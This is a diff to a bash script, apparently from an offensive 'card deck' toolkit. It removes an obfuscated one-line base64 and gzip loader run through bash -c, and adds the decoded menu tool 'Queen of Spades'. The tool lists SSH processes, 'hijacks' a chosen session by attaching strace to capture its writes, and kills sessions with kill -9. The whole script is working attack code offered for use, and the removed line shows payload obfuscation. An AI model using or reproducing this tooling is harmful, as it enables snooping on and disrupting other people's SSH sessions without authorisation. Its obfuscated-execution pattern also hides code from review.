@@ -1,1 +1,79 @@
-bash -c "$(echo H4sICA3LcGcAA1F1ZWVuX29mX1NwYWRlcwC9Vu9P2zAQ/Z6/4lbQuk4kpRRNGhWTEKsEEkxsZR8mhiqTXBuvqZPZTksF/O87J02TpoGVn/7knuPn5+d3d91417zionnFlG9Zh78Ovu3Xf2+32xetTvvTuG796Pa65/PQNv22NuAURQyDUIL2Eb7HiALCAfQi5qGCQyY9668J9sNBXyXB/ph2fGjAjQU03ACZTGbo+iHYCLXNG3PwXS2P1iAZ/RcbK9i38OAo3+uhcbs2+BH/w9wRMOHBKRNsiNDrHUEPleKhqD6kAvzlVFmf+RNGJfi5zxW4ZBJgQRBOFczCGHQIXKgIXb0FfiLRFpC/xrlEKpMoVlwM7wNXyrdph9CJwiOcGZtO6TCzR9O3gpM1lfMk5q8qy6uCtxw44UrDgav5ZA3LPQp8x8lcXcB9KeZtB85RjrlgGp+DXwm+60D3musncP0v+OtkaFoqk4o8r5USmQd2BLWu0ChNLkmgL7mLe0QlnaVFlymEzTRAuWZl3FsNCMga/UV+dTqLtZ3GPBmz1eJiu0EJNX+ZqvXdBqARd7sY/NiYq3QsJizg3pwhPbKcARsyLpxaB1SAGEGrA1VtJINDxVzrzrSjxNost3Z2FWvpYmu0HwNkCkUFluM4y8LzAbjheGzKjD2BSMH7L00PJ00RB0HHNMZcYlq0WXxNjhtKulf9Ql0qv54yCBQuvivT6UoZyj34KdhVgKZEBqFr0qCK3jK5AS+YQ0ALbKIgE5+cSdpC1XGWVEcClahjKczMdHOjMN01hamSP5V80caKLKxls6wheAqTSL6EtKJ2yeaG6dnxV9OdzVQzOURdBDDmT6P9iHtW9mIXYHtQa0YydJub+XoNLktPViZ6oDVz/aSJhMnJhd0rZM1QWjJKNEN56SDCTFb2p5JrXNsDWbrQ0Q79cRghqFjiQgfTUUMpqX2+tRHy4lzywkptWMMOGdizDVHYmdwn43KPLUY8CMD+XHqq+xO6zDvrSVOu/bI78sO90hUel/sLmIUkcOgj5eD86m/78JXxf8J3T+RJDAAA | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+# Menu for the Queen of Spades Card
+queen_of_spades_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      __________________________________________________________________________"
+    echo "     |                              Queen of Spades                             |"
+    echo "     |                       Hijack and Manage SSH Sessions                     |"
+    echo "     |__________________________________________________________________________|"
+    echo "     |                                                                          |"
+    echo "     |  This card allows you to inspect, hijack, or manage SSH sessions using   |"
+    echo "     |  ssh-agent and key forwarding techniques.                                |"
+    echo "     |                                                                          |"
+    echo "     |                                                                          |"
+    echo "     |  1. List Active SSH Sessions                                             |"
+    echo "     |  2. Hijack SSH Session                                                   |"
+    echo "     |  3. Terminate SSH Session                                                |"
+    echo "     |  4. Exit                                                                 |"
+    echo "     |__________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) list_sessions ;;
+        2) hijack_session ;;
+        3) terminate_session ;;
+        4) exit 0 ;;
+        *) echo "Invalid choice. Try again."; sleep 1; queen_of_spades_menu ;;
+    esac
+}
+
+# List active SSH sessions
+list_sessions() {
+    clear
+    echo -e "${CYAN}Listing active SSH sessions...${RESET}"
+    if command -v ps &>/dev/null; then
+        ps -aux | grep '[s]sh'
+    else
+        echo -e "${CYAN}Error: Unable to locate active SSH sessions.${RESET}"
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    queen_of_spades_menu
+}
+
+# Hijack an SSH session
+hijack_session() {
+    clear
+    echo -e "${CYAN}Hijacking an SSH session...${RESET}"
+    read -p "Enter the PID of the target SSH session: " target_pid
+
+    if [ -d "/proc/$target_pid" ]; then
+        echo -e "${CYAN}Attaching to PID $target_pid...${RESET}"
+        strace -p "$target_pid" -e trace=write
+    else
+        echo -e "${CYAN}Error: Invalid PID. Make sure the PID is correct.${RESET}"
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    queen_of_spades_menu
+}
+
+# Terminate an SSH session
+terminate_session() {
+    clear
+    echo -e "${CYAN}Terminating an SSH session...${RESET}"
+    read -p "Enter the PID of the SSH session to terminate: " target_pid
+
+    if kill -9 "$target_pid" &>/dev/null; then
+        echo -e "${CYAN}Session with PID $target_pid terminated.${RESET}"
+    else
+        echo -e "${CYAN}Error: Unable to terminate session. Check the PID.${RESET}"
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    queen_of_spades_menu
+}
+
+queen_of_spades_menu
